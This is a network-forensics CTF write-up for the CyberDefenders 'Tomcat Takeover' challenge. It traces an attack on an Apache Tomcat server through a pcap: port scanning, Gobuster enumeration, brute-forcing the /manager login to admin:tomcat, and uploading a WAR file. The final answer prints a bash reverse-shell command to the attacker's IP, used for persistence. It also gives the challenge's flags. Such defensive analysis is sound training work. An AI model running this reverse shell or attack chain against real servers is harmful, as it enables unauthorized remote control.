---
title: CyberDefender - Tomcat Takeover
tags: [CyberDefender, Network Forensics]

---

# CyberDefender - Tomcat Takeover
Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/135#nav-questions

:::spoiler TOC
[TOC]
:::

## Scenario
>  Our SOC team has detected suspicious activity on one of the web servers within the company's intranet. In order to gain a deeper understanding of the situation, the team has captured network traffic for analysis. This pcap file potentially contains a series of malicious activities that have resulted in the compromise of the Apache Tomcat web server. We need to investigate this incident further.

## ==Q1==
> Given the suspicious activity detected on the web server, the pcap analysis shows a series of requests across various ports, suggesting a potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server? 
### Recon
直覺就是先看endpoint或conversation
### Exploit
可以看到==14.0.0.120==和內網的`10.0.0.112`，代表前者應該就是此次的外部攻擊者
![image](https://hackmd.io/_uploads/HkPNR5tUp.png)

:::spoiler Flag
Flag: `14.0.0.120`
:::
## ==Q2==
> Based on the identified IP address associated with the attacker, can you ascertain the city from which the attacker's activities originated? 
### Recon
找到IP後丟到whois看detailed info
### Exploit
這一題問的是city，不是province，所以要填廣州，不是廣東
![image](https://hackmd.io/_uploads/HJakbiFIT.png)

:::spoiler Flag
Flag: `Guangzhou`
:::
## ==Q3==
> From the pcap analysis, multiple open ports were detected as a result of the attacker's activitie scan. Which of these ports provides access to the web server admin panel? 
### Recon
隨便猜

:::spoiler Flag
Flag: `8080`
:::
## ==Q4==
> Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process? 
### Recon
這一題直接問chat-gpt，因為工具太多了，乾脆直接問AI最快
### Exploit
[ChatGPT Answer](https://chat.openai.com/share/72f8bf09-7c96-46c6-87a4-96b2e27e1f80)
> Dirb / Dirbuster / Gobuster / Dirsearch:
> * These tools are designed to brute-force directories and files on web servers by making requests with different wordlists.

:::spoiler Flag
Flag: `Gobuster`
:::
## ==Q5==
> Subsequent to their efforts to enumerate directories on our web server, the attacker made numerous requests trying to identify administrative interfaces. Which specific directory associated with the admin panel was the attacker able to uncover? 
### Recon
這一題是從tcp flow中的transport file，慢慢回推回去tcp stream再詳細看其中的packet，因為根據題目敘述，它應該是狂送一大堆封包去爆目錄，所以我們只要往大方向觀察就知道大概在哪一段
### Exploit
根據extracted file的內容，在#20649附近的stream已經可以拿到reverse shell了，代表從這邊往前可能是個不錯的選擇
![image](https://hackmd.io/_uploads/ByRj4ot8a.png)
果不其然，它的順序一定是先爆路徑，之後再想怎麼塞reverse shell，所以從下圖可以知道有一大堆的404 error request，跟著他的stream就可以看到最重要的那個sub-path
![image](https://hackmd.io/_uploads/H1YNVjKIa.png)
又題目說到該頁面是個admin panel，代表應該是個可以登入做authentication的地方，所以後續看到的第一個status code 200的/example就不是我們的目標，而是再更後面的==/manager==，因為它有login stage
![image](https://hackmd.io/_uploads/H1CjUsK8a.png)

:::spoiler Flag
Flag: `/manager`
:::
## ==Q6==
> Upon accessing the admin panel, the attacker made attempts to brute-force the login credentials. From the data, can you identify the correct username and password combination that the attacker successfully used for authorization? 
### Recon
呈上題，拿到登入頁面當然就是要爆帳密，所以往後面的stream看可以發現有很多嘗試login的request，但都是401 Unauthorized
### Exploit
從下圖可以發現，往後刷幾個packets就有一個status 200的response，也就是attacker成功嘗試登入的response，從這邊把credential抓到base64 decode就會發現帳密
![image](https://hackmd.io/_uploads/HyM5DoYUT.png)

:::spoiler Flag
Flag: `admin:tomcat`
:::
## ==Q7==
> Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data? 
### Recon
往後看tcp stream會發現manager有upload的功能，所以attacker嘗試上傳一些東西，應該是一個zip file
### Exploit
![image](https://hackmd.io/_uploads/BJCtKjF8T.png)

:::spoiler Flag
Flag: `jxqozy.war`
:::
## ==Q8==
> Upon successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence? 
### Recon
再往後看同一個stream的其他packet，發現server response 200，上傳成功後就可以直接進入reverse shell，接著就是看它的指令，發現他想要常駐在該台電腦上
### Exploit
![image](https://hackmd.io/_uploads/B12M5stLa.png)

:::spoiler Flag
Flag: `/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'`
:::